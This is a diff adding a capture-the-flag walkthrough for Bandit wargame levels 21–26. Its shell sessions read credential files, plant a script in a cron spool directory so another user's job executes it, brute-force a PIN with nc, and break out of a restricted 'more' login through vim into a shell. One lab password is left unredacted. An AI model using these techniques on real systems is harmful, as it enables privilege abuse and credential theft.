@@ -411,3 +411,186 @@ Password matches, sending next password
 [REDACTED - New Password]
 [1]+  Done echo "[REDACTED - Current Password]" | netcat -lp 4444
 ```
+## Level 21 → 22
+### Explanation
+In this challenge we will get to learn cronjobs, it's a scheduling utility present in unix-like systems.
+\
+We need to list the crons, check what scripts are being executed and based on that we can solve the challenge.
+\
+This one was straightforward, the cronjob will execute a script to copy the next level password to the "tmp" directory and we can simply echo out its content.
+\
+Knowing how cronjobs work and how to create/configure them is a must-have skill, so here are some resources:
+\
+[Read More - Article](https://www.cyberciti.biz/faq/how-do-i-add-jobs-to-cron-under-linux-or-unix-oses/)
+\
+[Read More - Article](https://www.freecodecamp.org/news/cron-jobs-in-linux)
+### Solution
+```bash
+bandit21@bandit:~$ cd /etc/cron.d
+bandit21@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:/etc/cron.d$ ls -l /usr/bin/cronjob_bandit22.sh # we can execute and read the script, so let's have a look
+-rwxr-x--- 1 bandit22 bandit21 130 May  7  2020 /usr/bin/cronjob_bandit22.sh
+bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+[REDACTED]
+```
+## Level 22 → 23
+### Explanation
+This challenge is very similar to the previous challenge, but with a more complicated script that we need to understand.
+\
+The script is copying the password of whoever user executing it to the "tmp" directory in a file named the md5 hash of the name, if this makes sense.
+\
+So in short, the target is the md5 of the user executing the script.
+### Solution
+```bash
+bandit22@bandit:~$ cd /etc/cron.d
+bandit22@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d   -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d   -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+[REDACTED]
+```
+
+## Level 23 → 24
+### Explanation
+Still with the cronjobs challenges, but this time we need to understand and write our first script.
+\
+Going through the script (code in the solution), we can see that it's simply deleting the files of a given directory, in our case "/var/spool/bandit24", but if the file is owned by the current user it will be executed, which means we need to create a script that copies the password to somewhere we can read it, like the "tmp" directory.
+\
+So here are the steps:
+1. Create a script.
+2. Make the script executable.
+3. Create an empty file (where we will be saving our password).
+4. Make the file _writable_ by "others", remember the script will be run as "bandit24", so the file permission should be something like xx2, xx3, xx6 or xx7.
+
+You can read more about file permissions [here](https://www.guru99.com/file-permissions.html).
+### Solution
+```bash
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i # the line we need to focus in
+        fi
+        rm -f ./$i
+    fi
+done
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/oussamalevel24
+bandit23@bandit:/etc/cron.d$ cd /tmp/oussamalevel24
+bandit23@bandit:/tmp/oussamalevel24$ nano script.sh
+# the content of the script
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/oussamalevel24/bandit24
+bandit23@bandit:/tmp/oussamalevel24$ chmod +x script.sh
+bandit23@bandit:/tmp/oussamalevel24$ touch bandit24
+bandit23@bandit:/tmp/oussamalevel24$ chmod a+w bandit24
+bandit23@bandit:/tmp/oussamalevel24$ cp script.sh /var/spool/bandit24
+bandit23@bandit:/tmp/oussamalevel24$ # wait one minute or so
+bandit23@bandit:/tmp/oussamalevel24$ cat bandit24
+[REDACTED]
+```
+
+## Level 24 → 25
+### Explanation
+In this challenge, we need to make another script to create 10000 combinations, so we can _brute-force_ the service running on port 30002.
+\
+The service accepts our current password plus a 4-digit pin separated by a space.
+Example: bandit24_password 1234
+\
+Brute forcing is a very common attack that consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly, I highly recommend reading about its techniques and tools here:
+\
+[Read More - Article](https://resources.infosecinstitute.com/topic/kali-linux-top-5-tools-for-password-attacks/)
+\
+[Read More - Article](https://geekflare.com/brute-force-attack-tools/)
+\
+[Read More - Article](https://www.tutorialspoint.com/kali_linux/kali_linux_password_cracking_tools.htm)
+
+### Solution
+```bash
+bandit24@bandit:~$ mkdir /tmp/oussamalevel25
+bandit24@bandit:~$ cd /tmp/oussamalevel25
+bandit24@bandit:/tmp/oussamalevel25$ nano script.sh
+# paste the script content, we are simply creating all the possible combinations
+#!/bin/bash
+
+for i in {0000..9999}; do
+        # note the use of >> so append and not overwrite
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> passwords
+done
+bandit24@bandit:/tmp/oussamalevel25$ chmod +x script.sh
+bandit24@bandit:/tmp/oussamalevel25$ ./script.sh
+bandit24@bandit:/tmp/oussamalevel25$ cat passwords | nc localhost 30002 >> result
+bandit24@bandit:/tmp/oussamalevel25$ cat result | grep 'The password'
+The password of user bandit25 is [REDACTED]
+```
+
+## Level 25 → 26
+### Explanation
+In this challenge we will need to abuse the "more" command.
+\
+More command is used to view the text files in the command prompt, displaying one screen at a time in case the file is large, and the key to the challenge is that it will not finish executing as long as there is more content to be displayed.
+\
+Hopefully the solution will make sense.
+### Solution
+```bash
+bandit25@bandit:~$ ls -l
+total 4
+-r-------- 1 bandit25 bandit25 1679 May  7  2020 bandit26.sshkey
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@127.0.0.1
+# Connection closed immediately
+bandit25@bandit:~$ cat /etc/passwd | grep "bandit26"
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext # not a regular shell
+bandit25@bandit:~$ cat /usr/bin/showtext # let's have a look
+#
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt # we need to find a way not to hit the exit 0
+exit 0
+bandit25@bandit:~$ # minimise your terminal so there is always some content for "more" to display and this way we won't be exiting the script
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@127.0.0.1
+bandit25@bandit:~$ # this time it won't exit, so let's abuse more, by entering vim, hit v
+bandit25@bandit:~$ # we can use vim to spawn a shell, (make sure you are in command mode by hitting esc) type :set shell=/bin/bash then type :shell, that's it!
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+[REDACTED]
+```
